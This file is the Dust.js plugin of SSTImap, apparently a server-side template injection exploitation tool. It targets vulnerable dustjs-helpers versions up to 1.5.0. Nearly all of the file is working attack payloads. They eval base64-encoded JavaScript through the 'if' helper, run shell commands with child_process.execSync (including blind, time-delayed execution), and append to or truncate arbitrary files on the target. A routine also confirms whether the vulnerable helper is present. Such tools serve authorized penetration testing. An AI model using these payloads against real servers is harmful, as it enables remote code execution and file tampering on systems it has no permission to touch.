from utils.loggers import log
from plugins.languages import javascript
from utils import rand
from core import bash


class Dust(javascript.Javascript):
    legacy_plugin = True
    header_type = "cat"
    priority = 7
    plugin_info = {
        "Description": """Dust.js template engine""",
        "Usage notes": "Exploitation is only possible if dustjs-helpers of versions <=1.5.0 are installed.",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Github: https://github.com/linkedin/dustjs",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """{header[0]}{{!123!}}{header[1]}""",
                'trailer': """{trailer[0]}{{!123!}}{trailer[1]}""",
                'test_render': f'{rand.randstrings[0]}{{!qwe!}}{{#x a="{rand.randstrings[2]}" b="{rand.randstrings[1]}"}}{{:else}}{{b}}{{a}}{{/x}}',
                'test_render_expected': f'{rand.randstrings[0]}{rand.randstrings[1]}{rand.randstrings[2]}'
            },
            'render_error': {
                # Errors are caught by default, but it is up to the user to decide what to do with them
                'call': 'inject',
                'render': """{code}""",
                'header': """{{@if cond="''['x']['{header[0]}'+'{header[1]}'+(""",
                'trailer': """).toString()+'{trailer[0]}'+'{trailer[1]}']"}}{{/if}}""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{@if cond="context.global.sstimap=eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}{{sstimap}}"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}"""
            },
            'execute': {
                'call': 'evaluate',
                'exfiltrate': 'base64',
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'write': {
                'call': 'evaluate',
                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """require('fs').writeFileSync('{path}', '')"""
            },
            'execute_blind': {
                'call': 'evaluate_blind',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            }
        })

        self.set_contexts([
                # Text context, no closures. This covers also {%s} e.g. {{payload}} seems working.
                {'level': 0},
                # Block as {#key}{/key} and similar needs tag key name to be bypassed.
                # Comment blocks
                {'level': 1, 'prefix': '!}}]', 'suffix': '{!'},
            ])

    def rendered_detected(self):
        # Only makes sense for true rendered, as other techniques implicitly check for helpers
        if not self.get('error', False):
            # Further exploitation requires if helper, which has
            # been deprecated in version dustjs-helpers@1.5.0 .
            # Check if helper presence here.
            rand_A = rand.randstr_n(2)
            rand_B = rand.randstr_n(2)
            rand_C = rand.randstr_n(2)
            expected = rand_A + rand_B + rand_C
            if expected in self.inject(f'{rand_A}{{@if cond="1"}}{rand_B}{{/if}}{rand_C}'):
                log.log(21, f"{self.plugin} plugin has confirmed the presence of dustjs 'if' helper <= 1.5.0")
            else:
                log.log(22, f"{self.plugin} plugin has not found 'if' helper <= 1.5.0, evaluation is not possible.")
        super().rendered_detected()
